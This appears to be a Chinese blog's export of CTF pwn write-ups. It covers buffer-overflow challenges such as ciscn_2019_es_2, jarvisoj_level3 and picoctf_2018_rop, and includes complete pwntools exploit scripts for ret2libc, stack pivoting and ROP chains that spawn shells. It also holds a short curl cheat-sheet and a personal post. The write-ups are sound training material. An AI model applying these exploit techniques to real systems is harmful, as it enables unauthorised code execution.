class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">	<span class="keyword">if</span> content == <span class="number">1</span>:</span><br><span class="line">		p = process(<span class="string">&#x27;ciscn_2019_c_1&#x27;</span>)</span><br><span class="line">	<span class="keyword">else</span>:	</span><br><span class="line">		p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29999</span>)</span><br><span class="line"></span><br><span class="line">	payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x50</span> + <span class="number">8</span>)</span><br><span class="line">	payload = payload + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Input your choice!\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Input your Plaintext to be encrypted\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">	p.recvuntil(<span class="string">&#x27;Ciphertext\n&#x27;</span>)	</span><br><span class="line">	p.recvline()</span><br><span class="line">	puts_addr = u64(p.recv(<span class="number">7</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">	<span class="built_in">print</span>(puts_addr)      <span class="comment">#找出puts的地址</span></span><br><span class="line"></span><br><span class="line">	libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line"></span><br><span class="line">	libc_base   = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)      <span class="comment">#找出函数地址偏移量</span></span><br><span class="line">	system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)      <span class="comment">#计算出system的在程序中的地址</span></span><br><span class="line">	binsh_addr  = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)	</span><br><span class="line"></span><br><span class="line">	payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x50</span> + <span class="number">8</span>)</span><br><span class="line">	payload = payload + p64(ret) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line"></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Input your choice!\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Input your Plaintext to be encrypted\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">	p.interactive()</span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>cat flag</p>
<p><img src="/img/image-20210501002359709.png" alt="image-20210501002359709"></p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>blog诞生日2021.6.17</title>
    <url>/2021/06/17/blog%E8%AF%9E%E7%94%9F%E6%97%A52021-6-17/</url>
    <content><![CDATA[<span id="more"></span>
<p>经过一下午不懈的努力，我终于在2021年6月17日下午17：30成功搭建了我的博客，在这发文纪念一下！<br><img src="/img/%E8%AF%9E%E7%94%9F%E6%97%A5.jpg"></p>
]]></content>
      <categories>
        <category>日常闲话</category>
      </categories>
      <tags>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>ciscn_2019_es_2</title>
    <url>/2021/06/28/ciscn-2019-es-2/</url>
    <content><![CDATA[<h1 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h1><p>检查保护机制，32位，开启NX</p>
<p><img src="/img/image-20210628215206342.png" alt="image-20210628215206342"></p>
<p>IDA打开，shift+F12查找字符串，发现sysytem函数，但没有/bin/sh，还是无法直接利用</p>
<p><img src="/img/image-20210628215304461.png" alt="image-20210628215304461"></p>
<p>找到system函数真实地址0x8048400</p>
<p><img src="/img/image-20210628215541204.png" alt="image-20210628215541204"></p>
<p>main函数，还是一样，里面的vlu()函数肯定是重点</p>
<p><img src="/img/image-20210628215636474.png" alt="image-20210628215636474"></p>
<p><img src="/img/image-20210628215644207.png" alt="image-20210628215644207"></p>
<p>读入0x30字节数据给s，s大小是0x28，只能溢出0x8字节，覆盖到ret，没法构造太长的rop，但是这边可以给s写入2次数据。</p>
<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>我们可以通过第一次输入来泄露程序里的ebp地址，知道了ebp的地址就能够推算出参数s在栈上的地址，第二次直接往栈上写入system（‘/bin/sh’），之后利用leave；ret的栈劫持去到参数s的栈，让它去执行我们布置在栈上的system（‘/bin/sh’）来获取shell。</p>
<h3 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h3><p>1.泄露ebp</p>
<p>printf函数在输出时遇到’\0’会停止，若将s填满，这样在末尾就无法加上’\0’，就可以泄露ebp了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x27</span>+<span class="string">&#x27;b&#x27;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">ebp=u32(r.recv(<span class="number">4</span>))</span><br></pre></td></tr></table></figure>

<p>2.找到s在栈上的位置</p>
<p>算出ebp-0x38是参数s在栈上的位置</p>
<p>3.布置栈上的值</p>
<p><img src="/img/image-20210628221147958.png" alt="image-20210628221147958"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">&#x27;aaaa&#x27;</span>+p32(sys)+p32(main)+p32(s+<span class="number">0x10</span>)+<span class="string">&quot;/bin/sh&quot;</span></span><br></pre></td></tr></table></figure>

<p>第一个’aaaa‘随便输入，如果一开始将system函数写第一个，那么我们在用leave；ret劫持栈的时候要抬高4字节<br>接着跟上system函数的地址<br>后面是执行完system函数后的返回地址，这边也可以随便写<br>之后是一个地址，这个地址指向的是我们写在栈上的’/bin/sh‘字符串</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload2=payload2.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>）</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload2+=p32(s)+p32(leave_ret)</span><br></pre></td></tr></table></figure>

<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27757</span>)</span><br><span class="line"></span><br><span class="line">sys=<span class="number">0x8048400</span></span><br><span class="line">leave_ret=<span class="number">0x08048562</span></span><br><span class="line">main=<span class="number">0xdeadbeef</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x27</span>+<span class="string">b&#x27;b&#x27;</span></span><br><span class="line">r.send(payload)</span><br><span class="line">r.recvuntil(<span class="string">&quot;b&quot;</span>)</span><br><span class="line">s=ebp=u32(r.recv(<span class="number">4</span>))-<span class="number">0x38</span></span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;aaaa&#x27;</span>+p32(sys)+p32(main)+p32(s+<span class="number">0x10</span>)+<span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">payload2=payload2.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload2+=p32(s)+p32(leave_ret)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.send(payload2)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>cat flag</p>
<p><img src="/img/image-20210628221613459.png" alt="image-20210628221613459"></p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>jarvisoj_level3</title>
    <url>/2021/06/28/jarvisoj-level3/</url>
    <content><![CDATA[<h1 id="jarvisoj-level3"><a href="#jarvisoj-level3" class="headerlink" title="jarvisoj_level3"></a>jarvisoj_level3</h1><p>检查保护机制，32位，开NX</p>
<p><img src="/img/image-20210628222619420.png" alt="image-20210628222619420"></p>
<p>IDA打开，shift+F12没有找到system和’/bin/sh’，所以应该也是libc泄露</p>
<p>查看main函数，又看到了熟悉的vulnerable_function()函数</p>
<p><img src="/img/image-20210628222739706.png" alt="image-20210628222739706"></p>
<p><img src="/img/image-20210628222833493.png" alt="image-20210628222833493"></p>
<p>果然漏洞就在这个函数里</p>
<p>写入长度只有7，而读的长度有0x100，漏洞很大</p>
<p>解题思路和前几个题都类似了</p>
<h3 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h3><p>1.通过write函数泄露libc版本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(write_plt)+p32(main)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;Input:\n&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">write_addr=u32(r.recv(<span class="number">4</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>2.计算libc基址，算出system和/bin/sh的地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">libc_base=write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">sh=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>3.构造rop，执行system(‘/bin/sh’)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(system)+p32(main)+p32(sh)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Input:\n&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br></pre></td></tr></table></figure>

<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28991</span>)</span><br><span class="line"><span class="comment">#r=process(&#x27;./level3&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main=<span class="number">0x804844B</span></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(write_plt)+p32(main)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;Input:\n&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">write_addr=u32(r.recv(<span class="number">4</span>))</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"><span class="comment">#libc=LibcSearcher(&#x27;write&#x27;,write_addr)</span></span><br><span class="line">libc_base=write_addr-libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sh=libc_base+ <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(system)+p32(main)+p32(sh)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Input:\n&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>cat flag</p>
<p><img src="/img/image-20210706133135129.png" alt="image-20210706133135129"></p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>jarvisoj_level3_x64</title>
    <url>/2021/07/11/level3-x64/</url>
    <content><![CDATA[<h1 id="jarvisoj-level3-x64"><a href="#jarvisoj-level3-x64" class="headerlink" title="jarvisoj_level3_x64"></a>jarvisoj_level3_x64</h1><p>检查保护机制，64位，开NX</p>
<p><img src="/img/image-20210711122341042.png" alt="image-20210711122341042"></p>
<p>IDA打开，</p>
<p>main函数</p>
<p><img src="/img/image-20210711123946252.png" alt="image-20210711123946252"></p>
<p>发现function函数，找到栈溢出漏洞</p>
<p><img src="/img/image-20210711124005975.png" alt="image-20210711124005975"></p>
<p>写入长度为7，读的长度为0x200</p>
<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>1.泄露read地址得到libc版本</p>
<p>2.获取system和‘/bin/sh’的地址</p>
<p>3.返回主函数进行夺权</p>
<h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><p>因为是64位，所以考虑寄存器问题</p>
<p>需要构造write(1, read_got, 8)，即将rdi=1<code>，</code>rsi=read_got<code>，</code>rdx=8</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary level3_x64 --only “pop|ret”</span><br></pre></td></tr></table></figure>

<p><img src="/img/image-20210711132937061.png" alt="image-20210711132937061"></p>
<p>利用出栈指令<code>pop</code>给对应的寄存器赋值，但这里没有<code>pop rdx</code>，通过查看反汇编可以发现构造栈溢出前<code>rdx=0x200</code>，足够将<code>read</code>函数的真实地址泄露出来</p>
<p>第二次栈溢出跳转执行<code>system(&quot;/bin/sh&quot;)</code></p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;amd64&quot;</span>, log_level= <span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">29641</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./level3_x64&quot;</span>)</span><br><span class="line"></span><br><span class="line">read_got = elf.got[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&quot;main&quot;</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x4006b3</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x4006b1</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x88</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">1</span>)						<span class="comment">#设置write第一个参数为1</span></span><br><span class="line">payload += p64(pop_rsi_r15_ret) + p64(read_got) + p64(<span class="number">0</span>)	<span class="comment">#设置write第二个参数为read_got</span></span><br><span class="line">payload += p64(write_plt)									<span class="comment">#调用write函数</span></span><br><span class="line">payload += p64(main_addr)									<span class="comment">#调用完write返回主函数</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input:&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">read_addr = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))	<span class="comment">#接收泄露的read函数的真实地址</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;read&quot;</span>, read_addr)</span><br><span class="line">libc_base = read_addr - libc.dump(<span class="string">&quot;read&quot;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x88</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(binsh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input:&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/img/image-20210711133802398.png" alt="image-20210711133802398"></p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>ciscn_s_3</title>
    <url>/2021/06/28/ciscn-s-3/</url>
    <content><![CDATA[<h1 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a>ciscn_2019_s_3</h1><p>检查保护机制，64位，开NX</p>
<h2 id=""><a href="#" class="headerlink" title=""></a><img src="/img/image-20210628173000858.png" alt="image-20210628173000858"></h2><p>IDA打开，查看main函数，里面只有一个vuln函数</p>
<p><img src="/img/image-20210628173110722.png" alt="image-20210628173110722"></p>
<p>再查看vuln函数，一个sys_read,一个sys_write,写入0x400，读0x30，这里就发现栈溢出的漏洞</p>
<p><img src="/img/image-20210628173134218.png" alt="image-20210628173134218"></p>
<p>然后又发现了一个gadget函数</p>
<p><img src="/img/image-20210628173525340.png" alt="image-20210628173525340"></p>
<p><img src="/img/image-20210628174307696.png" alt="image-20210628174307696"></p>
<h3 id="这里要注意："><a href="#这里要注意：" class="headerlink" title="这里要注意："></a>这里要注意：</h3><p>  mov      rax, 15       sys_rt_sigreturn</p>
<p>  mov      rax, 59       sys_execve</p>
<p>gadget函数没有被直接调用，该函数设置了rax=15并返回，推测可能和系统调用号有关。查到ubuntu18 64位系统调用号15为<strong>rt_sigreturn</strong>，用于恢复从用户态进入内核态所保存的上下文（即寄存器信息），59为<strong>execve</strong>，作用是执行一个新的程序，程序可以是二进制的可执行程序，也可以是shell、pathon脚本</p>
<h3 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h3><p>59号系统调用是execve那么就可以想办法控制寄存器的值调用execve(“/bin/sh”,0,0)，注意在调用execve时，后面两个参数需要置0，由于需要控制rdx的值，所以选择使用通用gadget，__libc_csu_init。</p>
<p><img src="/img/image-20210628175901200.png" alt="image-20210628175901200"></p>
<p>r13的值会给到rdx，让rbx=0，下面call的时候会变为call [r12]，会去call r12指向位置的代码，我们可以调到后面的rop执行，所以需要知道栈的地址，我们获取/bin/sh字符串时也需要知道栈地址。这题刚好在write的时候0x28这个位置是栈上的值，于是通过计算可以得到栈上/bin/sh的地址，即rsp-0x10的值。</p>
<h3 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h3><h3 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">28640</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./ciscn_s_3&#x27;)</span></span><br><span class="line">main=<span class="number">0x0004004ED</span></span><br><span class="line">execve=<span class="number">0x04004E2</span></span><br><span class="line">pop_rdi=<span class="number">0x4005a3</span></span><br><span class="line">pop_rbx_rbp_r12_r13_r14_r15=<span class="number">0x40059A</span></span><br><span class="line">mov_rdxr13_call=<span class="number">0x0400580</span> </span><br><span class="line">sys=<span class="number">0x00400517</span></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>*<span class="number">2</span>+p64(main)</span><br><span class="line">io.send(payload1)</span><br><span class="line">io.recv(<span class="number">0x20</span>)</span><br><span class="line">sh=u64(io.recv(<span class="number">8</span>))-<span class="number">280</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(sh))</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>*<span class="number">2</span>+p64(pop_rbx_rbp_r12_r13_r14_r15)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(sh+<span class="number">0x50</span>)+p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload2+=p64(mov_rdxr13_call)+p64(execve)</span><br><span class="line">payload2+=p64(pop_rdi)+p64(sh)+p64(sys)</span><br><span class="line">io.send(payload2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>cat flag!</p>
<p><img src="/img/image-20210628181623724.png"></p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>CURL</title>
    <url>/2021/06/17/curl%E5%91%BD%E4%BB%A4%EF%BC%88http%E8%AF%B7%E6%B1%82%EF%BC%89/</url>
    <content><![CDATA[<h1 id="curl-命令"><a href="#curl-命令" class="headerlink" title="curl 命令"></a>curl 命令</h1><span id="more"></span>

<p>curl 命令在 Linux 操作系统中经常来测试网络和 url 的联通性，模拟正常的网络访问。除此之外，curl<br>还支持包括 HTTP、HTTPS、ftp 等众多协议，还支持 POST、cookies、认证、从指定偏移处下载部分文<br>件等功能<br>1.curl url(获取网址的文本信息)<br>2.curl -i url(获取文本的头部及文本信息)<br>3.curl -x proxy url(使用代理请求网页内容)<br>4.curl -v(获取整个通信过程)<br>5.curl -X url(使用特定方法请求网页文本)<br>6.curl -I url(仅返回头部信息)</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>get_started_3dsctf_2016</title>
    <url>/2021/06/17/get_started_3dsctf_2016/</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h1><p>查看保护机制，32位，开了NX</p>
<p><img src="/img/image-20210425011728468.png"></p>
<p>IDA打开，main函数上的get_flag函数里发现一个flag.txt</p>
<p><img src="/img/image-20210425011933854.png"></p>
<p>继续跟进发现当满足一个条件时，可以打开flag.txt，即为a1 == 814536271 &amp;&amp; a2 == 425138641时</p>
<p><img src="/img/image-20210425012146370.png"></p>
<p>点击a1查看到了在栈中的位置</p>
<p><img src="/img/image-20210425012353464.png"></p>
<p>但是这两个位置在返回地址之后，无法利用溢出覆盖来实现控制</p>
<p>只有继续看，tab+空格跳转之后发现了有关flag.txt的设置地址</p>
<p><img src="/img/image-20210425012826978.png"></p>
<p>从0x80489B8的位置开始才能打开flag.txt，于是想办法跳转到这儿</p>
<p><img src="/img/image-20210425013007535.png"></p>
<p>在main函数中发现可以利用gets函数溢出，覆盖返回地址，实现控制</p>
<p><img src="/img/image-20210425013149728.png"></p>
<h3 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./get_started_3dsctf_2016&#x27;</span>)</span><br><span class="line"><span class="comment">#r = remote(&quot;node3.buuoj.cn&quot; , 26419)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span>+p32(<span class="number">0x80489B8</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>但是没办法得到flag，这里还发现这样远程是无法连接的</p>
<p>看了网上的wp有大佬说需要维护栈，由于远端服务器中gets函数没有正常退出，它程序会崩溃，就无法获取到flag ，此时使用exit函数使gets函数强制退出，那么就能获得flag了，于是我又修改了exp，找到exit函数的位置,这时候也不需要再考虑a1、a2位置在返回地址后了，可以完全根据get_flag函数的要求来，传两个满足条件的数上去，然后顺理成章打开flag.txt得到flag</p>
<p><img src="/img/image-20210425162841539.png"></p>
<h3 id="exp2（强制退出）"><a href="#exp2（强制退出）" class="headerlink" title="exp2（强制退出）"></a>exp2（强制退出）</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26419</span>)</span><br><span class="line"><span class="comment">#r = process(&#x27;./get_started_3dsctf_2016&#x27;)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">get_addr = <span class="number">0x080489A0</span></span><br><span class="line">exit_addr = <span class="number">0x0804E6A0</span></span><br><span class="line"></span><br><span class="line">a1 = <span class="number">814536271</span></span><br><span class="line">a2 = <span class="number">425138641</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x38</span>)</span><br><span class="line">payload += p32(get_addr) + p32(exit_addr)</span><br><span class="line">payload += p32(a1) + p32(a2)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/img/image-20210425165227769.png"></p>
<p>虽然这种方法应该不是最正确的做法，但我觉得这方法挺聪明，正规的做法需要通过mprotect函数修改bss段的权限，然后传入shellcode，但我能力有限，暂时还不会</p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>picoctf_2018_rop</title>
    <url>/2021/07/17/picoctf-2018-rop/</url>
    <content><![CDATA[<h1 id="picoctf-2018-rop-chain"><a href="#picoctf-2018-rop-chain" class="headerlink" title="picoctf_2018_rop chain"></a>picoctf_2018_rop chain</h1><p>检查保护机制，32位，开NX</p>
<p><img src="/img/image-20210717100253970.png" alt="image-20210717100253970"></p>
<p>IDA打开</p>
<p>main函数，里面发现vuln函数</p>
<p><img src="/img/image-20210717100706788.png" alt="image-20210717100706788"></p>
<p><img src="/img/image-20210717100744059.png" alt="image-20210717100744059"></p>
<h4 id="漏洞点：没有限制输入字符串长度"><a href="#漏洞点：没有限制输入字符串长度" class="headerlink" title="漏洞点：没有限制输入字符串长度"></a>漏洞点：没有限制输入字符串长度</h4><p>然后发现了一个flag函数，仔细查看后发现这是一个后门函数</p>
<p><img src="/img/image-20210717101317225.png" alt="image-20210717101317225"></p>
<p>win_function1函数</p>
<p><img src="/img/image-20210717101703475.png" alt="image-20210717101703475"></p>
<p>win_function2函数</p>
<p><img src="/img/image-20210717101752632.png" alt="image-20210717101752632"></p>
<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">需要注意点就是，有个判断 条件<span class="keyword">if</span> <span class="comment">( win1 &amp;&amp; win2 &amp;&amp; a1 == -559039827 )</span>，需要控制wi<span class="symbol">n1</span>、wi<span class="symbol">n2</span>、a<span class="number">1</span></span><br><span class="line">wi<span class="symbol">n1</span>、wi<span class="symbol">n2</span>可以通过调用对应的函数进行赋值，而a<span class="number">1</span>是作为flag函数的参数，在栈上构造好数据即可</span><br></pre></td></tr></table></figure>

<p>先对win1赋值，使win1=1</p>
<p>然后当win_function2的参数a1=-1163220307，对win2进行赋值，win2=1</p>
<h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;i386&quot;</span>, log_level= <span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">28400</span>)</span><br><span class="line"></span><br><span class="line">win_function1 = <span class="number">0x080485CB</span></span><br><span class="line">win_function2 = <span class="number">0x080485D8</span></span><br><span class="line">flag = <span class="number">0x0804862B</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">0x1c</span></span><br><span class="line">payload += p32(win_function1)</span><br><span class="line">payload += p32(win_function2) + p32(flag) + p32(<span class="number">0xBAAAAAAD</span>) + p32(<span class="number">0xDEADBAAD</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;input&gt; &quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

